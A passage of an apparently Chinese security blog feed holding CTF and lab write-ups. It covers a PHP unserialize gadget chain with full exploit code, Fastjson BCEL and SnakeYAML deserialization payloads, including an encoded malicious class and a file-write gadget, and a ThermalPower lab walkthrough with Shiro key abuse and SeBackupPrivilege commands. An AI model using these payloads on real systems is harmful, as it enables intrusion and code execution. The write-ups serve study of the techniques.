class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个反序列化挺有意思的，首先很明显链尾应该是Taki的__call这里有个原生类的利用</p><p>那么链头应该是<strong>unserialize链子应该如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Taki&#123;__unserialize&#125;-&gt;Mitsuha&#123;__invoke&#125;-&gt;KatawareDoki&#123;__toString&#125;-&gt;Taki&#123;__call&#125;</span><br></pre></td></tr></table></figure><br>然后这里有两个坑，第一个是我们要C头绕过但是7.3版本以下才会转为C头但是</strong>unserialize在7.4才出，所以我们需要7.3生成payload，7.4调试，不能直接在7.3上运行payload。</p><p>第二个坑点是<strong>unserialize中的<code>$data[&#39;xxx&#39;]</code>这个xxx其实是我们序列化字符的<code>&#123;&quot;xxx&quot;:&quot;&quot;&#125;</code>key而我们都知道private属性的在序列化时会在前面加上一个%00类名%00，这样的话如果我们直接7.3序列化7.4反序列化就会导致</strong>unserialize。不赋值，所以我们需要将Taki的private属性改成public。</p><p>坑点结束后就是怎么利用这个原生类来命令执行了。<br>首先我们可以看到其使用create_function(“”, ‘die(<code>/readflag</code>);’);创造了一个匿名类。<br>那么可以尝试使用反射类来调用这个匿名类</p><img src="/2025/06/03/litCTF/IMG_20250603-194436904.png" class="">  <p>ReflectionFunction可以直接调用方法<br>而这个创建的那么类正好没有参数</p><p>那么只要知道这个匿名类的名称就可以得到flag了<br>本地测了一下第一次进入时叫lambda_1第二次叫lambda_2<br><img src="/2025/06/03/litCTF/IMG_20250603-194801031.png" class="">  </p><p>那么可以写exp了<br>写exp的时候又遇到一个问题就是在反序列化的时候</p><img src="/2025/06/03/litCTF/IMG_20250603-204054313.png" class="">  <p>在后面new的Taki也会触发__unserialize所以要给两个都附上值不然会报错<br>exp如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">create_function(&quot;&quot;, &#x27;echo &quot;aaaa&quot;;&#x27;);</span><br><span class="line"></span><br><span class="line">class Taki</span><br><span class="line">&#123;</span><br><span class="line">    public $musubi;</span><br><span class="line">    public $magic;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;musubi = $data[&#x27;musubi&#x27;];</span><br><span class="line">        $this-&gt;magic = $data[&#x27;magic&#x27;];</span><br><span class="line">        return ($this-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($func,$args)&#123;</span><br><span class="line">        (new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mitsuha</span><br><span class="line">&#123;</span><br><span class="line">    private $memory;</span><br><span class="line">    private $thread=&quot;asdw&quot;;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;memory=$a;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;memory.$this-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class KatawareDoki</span><br><span class="line">&#123;</span><br><span class="line">    private $soul;</span><br><span class="line">    private $kuchikamizake=&quot;ReflectionFunction&quot;;</span><br><span class="line">    private $name;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $a=new Taki();</span><br><span class="line">        $a-&gt;musubi=&quot;time&quot;;</span><br><span class="line">        $a-&gt;magic=&quot;invoke&quot;;</span><br><span class="line">        $this-&gt;soul=$a;</span><br><span class="line">        $this-&gt;name=urldecode(&quot;%00lambda_10&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);</span><br><span class="line">        return &quot;call error!no flag!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Taki();</span><br><span class="line">$a-&gt;musubi=new Mitsuha(new KatawareDoki());</span><br><span class="line"></span><br><span class="line">$arr=array(&quot;1&quot;=&gt;$a);</span><br><span class="line">$b=new ArrayObject($arr);</span><br><span class="line">$c=serialize($b);</span><br><span class="line">echo urlencode($c);</span><br><span class="line">//unserialize($c);</span><br><span class="line">unserialize(urldecode(&quot;C%3A11%3A%22ArrayObject%22%3A361%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bi%3A1%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A15%3A%22%00Mitsuha%00memory%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A18%3A%22%00KatawareDoki%00soul%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3Bs%3A4%3A%22time%22%3Bs%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7Ds%3A27%3A%22%00KatawareDoki%00kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A18%3A%22%00KatawareDoki%00name%22%3Bs%3A10%3A%22%00lambda_10%22%3B%7Ds%3A15%3A%22%00Mitsuha%00thread%22%3Bs%3A4%3A%22asdw%22%3B%7Ds%3A5%3A%22magic%22%3BN%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&quot;));</span><br></pre></td></tr></table></figure></p><p>匿名函数后面的数字稍微大点，然后多发几个包</p><img src="/2025/06/03/litCTF/IMG_20250603-204021179.png" class="">  ]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;easy-file&quot;&gt;&lt;a href=&quot;#easy-file&quot; class=&quot;headerlink&quot; title=&quot;easy_file&quot;&gt;&lt;/a&gt;easy_file&lt;/h1&gt;&lt;img src=&quot;/2025/06/03/litCTF/IMG_20250603-184</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>fastjson&amp;&amp;snakeyaml不出网利用</title>
    <link href="https://lisien11.xyz/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"/>
    <id>https://lisien11.xyz/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/</id>
    <published>2025-05-29T02:06:01.000Z</published>
    <updated>2025-06-03T09:10:08.836Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastJsonBCEL"><a href="#FastJsonBCEL" class="headerlink" title="FastJsonBCEL"></a>FastJsonBCEL</h1><p>首先就是要介绍一下BCEL链</p><p>apache-BCEL</p><p>在类加载时我们可以将，类转为字节码然后实验classloader来加载字节码，像是我们的CC3中的defineCLass。而这个我们要学的这个链，其就是利用加载字节码的方法来命令执行。但又有点不同，因为CC3是直接加载字节码，而我们这个链是利用了forName来加载</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>其payload如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line"><span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b......&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们直接看可以发现其实这个很短，就涉及到了两个类org.apache.tomcat.dbcp.dbcp2.BasicDataSourc和com.sun.org.apache.bcel.internal.util.ClassLoader</p><p>在反序列化时会触发到BasicDataSourc的getConnection<br><img src="/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/IMG_20250603-162632476.png" class=""><br>然后回走到createDataSource()方法<br><img src="/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/IMG_20250603-162936725.png" class="">  </p><p>然后走到createConnectionFactory</p><img src="/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/IMG_20250603-162829431.png" class="">  <p>最后回走到createConnectionFactory的forName里这里可以加载字节码，如果没有自定义ClassLoader就会直接通过forName来加载服务器上存在的类，这样子就无法达成我们的命令执行，所以我们要自定义ClassLoader，这里就直接使用BCEL的ClassLoader了。<br>像下面那样就可以实现命令执行</p><h3 id="BECL加载字节码"><a href="#BECL加载字节码" class="headerlink" title="BECL加载字节码"></a>BECL加载字节码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DDEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\target\\fastjson\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">BECL</span> <span class="operator">=</span>  Utility.encode(code,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="comment">//classLoader.loadClass(&quot;$$BCEL$$&quot;+BECL).newInstance();</span></span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span>+BECL,<span class="literal">true</span>,classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//恶意</span></span><br><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc&quot;</span>).start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/IMG_20250603-162206449.png" class="">  <p>所以我们需要控制driverClassName和driverClassLoader就可以命令执行了<br>即写出这样的payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">&quot;driverClassLoader&quot;: &#123;</span><br><span class="line">&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$eb$7c$d8$JI$J$n$n$v$fd$a0I$a1u8$d4$97$de$40$i$40T$aa$ea$96$aaF$89$a2$9e6f$L$h$8c$N$f6$a6$ed$3f$ea$99$LHD$zw$7e$Ub$d6$a4$a1$b4$f5afw$e6$bd7o$c7W$d7$X$bf$A$bcF$a7$88$Z$y$9axd$e2$b1$85$tE$Yx$aa$c3$92$89g$sZEXh$9bxnb$99$n$bf$$C$a96$Y2v$a7$cb$90$dd$8a$f6$E$c3$ac$xC$f1at4$Q$f1$$$l$ET$a9$ba$91$cf$83$$$8f$a5$beO$8aYu$m$T$8d$fe$c2$T5L$a2$d0Q$oQk$M$d6$ba$lLt$Z$e1$ea$ee$90$7f$e5$8e$8c$9c$b7$3b$db$df$7dq$acd$U$S$ac$ec$v$ee$l$be$e7$c7$a9$k$b9c$uz$d1$u$f6$c5$h$a9$f5$LZ$ee$95$e6$96PB$99$a1$99$ea$E$3c$dcw$3e$c6$91$_$92ds$q$83$3d$R3T$eeZ$9e$8ae$b8O$f6$c8$b1$af$99$x$r$bc$c0K$86$f9$ff$d8$60X$bcc$7e$g$85J$k$89iS$93m$f2y$ef$7d$f7f$ed$M$86$c2$a7$d2$82$fd$d9$fd$db$c1$9a$deh$$Q$3c$s$40$dd$ee$b8$ff$b8$a7$j4$ed$3f$ca$bb$Hq$f4M$ef$82$a8hA$ffG$fd$Z$60$fa$fd$U$l$d0$cd$a1$cc$u$e7V$cf$c1N$d3$f6$y$c5$fcm$R$V$8a$a5$c9y$OU$ca$W$e6$a7$e4$93$J$ae$3d$86$d1$cf$feD$a6$9f$a9f$bds$e4$ce$90$ef$fd$40$f9$dd$YV$9f$84$L$97$a7$v$ae$86$GLd$d2$J$L$a4$a8$d5jd$ab$81$C$9ad$b0E$b3$7eOlR$ad$86z$8a$E$b1$8c$9e$89F$nmh$93$Po$A$db$98$cc$b5$a1$C$A$A&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/IMG_20250603-164044715.png" class="">  </p><p>但是因为其是通过调用getter来命令执行的，所以无法应用到snakeyaml</p><h1 id="SnakeYAML无依赖不出网漏洞"><a href="#SnakeYAML无依赖不出网漏洞" class="headerlink" title="SnakeYAML无依赖不出网漏洞"></a>SnakeYAML无依赖不出网漏洞</h1><p><a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/">https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/</a><br>这条链子是通过fastJson的一条链子改过来的<br>在P牛的文章中给出了链子改后<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [&quot;success.jar&quot;],false],!!java.util.zip.Inflater &#123; input: !!binary eJxLLE5JTCkGAAh5AnE= &#125;,1048576]]</span><br></pre></td></tr></table></figure><br>上面的会写入一个文件，那么我们在学习SnakeYaML是曾学过ScriptEngineManager 的链子可以加载远程的恶意jar包，那么我们使用<code>file://</code>协议就可以加载本地的了</p><p>这样就可以实现一种不出网的利用</p><h1 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;FastJsonBCEL&quot;&gt;&lt;a href=&quot;#FastJsonBCEL&quot; class=&quot;headerlink&quot; title=&quot;FastJsonBCEL&quot;&gt;&lt;/a&gt;FastJsonBCEL&lt;/h1&gt;&lt;p&gt;首先就是要介绍一下BCEL链&lt;/p&gt;
&lt;p&gt;apache-B</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>春秋ThermalPower</title>
    <link href="https://lisien11.xyz/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/"/>
    <id>https://lisien11.xyz/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/</id>
    <published>2025-05-25T14:01:09.000Z</published>
    <updated>2025-05-26T03:13:20.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shiro-heapdump"><a href="#shiro-heapdump" class="headerlink" title="shiro+heapdump"></a>shiro+heapdump</h1><p>首先先拿fscan扫一下ip</p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-220603204.png" class="">  <p>可以发现存在heapdump的泄露</p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-103756006.png" class="">  <p>这个页面长的就很想shiro，扫一下指纹</p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-220658937.png" class="">  <p>果然是shiro<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-221624391.png" class=""><br>解密一下heapdump，可以得到shiro-key，这样就可以打shiro反序列化了<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-221718805.png" class=""><br>直接上线vshell<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-221852110.png" class=""><br>拿到flag1<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-221956296.png" class="">  </p><h1 id="工程师个人主机"><a href="#工程师个人主机" class="headerlink" title="工程师个人主机"></a>工程师个人主机</h1><p>然后再用fscan扫一下c段<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-104159647.png" class=""><br>可以扫到一下ftp。还有一个web，先看一下web</p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-104222068.png" class="">  <p>目录结构和ftp一样应该是把ftp的目录也给放到web了<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-104259303.png" class=""><br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-104309619.png" class=""><br>再内部资料里发现了admin的账号密码还有内部通知和exel表格<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-104405650.png" class=""><br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-104416324.png" class=""><br>看通知我们可以知道账号密码是由姓名+@+工号组成的，二表格是工程师的姓名加工号<br>使用第一个chenhua@0813即可登陆成功<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-224606060.png" class="">  </p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-224804310.png" class="">  <p>我们可以发现其是再Backup Operators组内的，但是其并没有这给组内的特权，我用网上的提权方法都无法成功，应该是环境的问题，我这里就记录一下这个提权方法<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-232917792.png" class="">  </p><p><a href="https://github.com/k4sth4/SeBackupPrivilege">https://github.com/k4sth4/SeBackupPrivilege</a><br>再GitHub上下载两个dll，进行如下操作就可以备份admin的目录了，而且可以使用dir来看admin目录<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; cd C:\Users\chenhua\Desktop\</span><br><span class="line">PS C:\Users\chenhua\Desktop&gt; Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line">PS C:\Users\chenhua\Desktop&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">PS C:\Users\chenhua\Desktop&gt; Set-SeBackupPrivilege</span><br><span class="line">PS C:\Users\chenhua\Desktop&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is enabled</span><br><span class="line">PS C:\Users\chenhua\Desktop&gt; Copy-FileSeBackupPrivilege C:\Users\Administrator\flag\flag02.txt C:\Users\chenhua\Desktop\flag02.txt -Overwrite</span><br><span class="line">Copied 350 bytes</span><br><span class="line">PS C:\Users\chenhua\Desktop&gt; cat flag02.txt</span><br></pre></td></tr></table></figure></p><h1 id="工程控制机器"><a href="#工程控制机器" class="headerlink" title="工程控制机器"></a>工程控制机器</h1><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-222841380.png" class="">  <p>看信息可以知道这个主机再.26，直接扫<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-105304043.png" class=""><br>可以发现其是172.22.26.11,直接rdp上去<br>进去后会强制进入控制系统，点锅炉开就可以得到flag<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-223309980.png" class="">  </p><p>然后win+d来退到桌面<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-105635213.png" class=""><br>可以发现一个备份文件ScadaDB.sql.locky<br>直接看数据库会发现数据库全是空的</p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-223718264.png" class="">  <p>那么只好解密这个了。我们拿题目的密钥来解</p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250525-232806601.png" class="">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 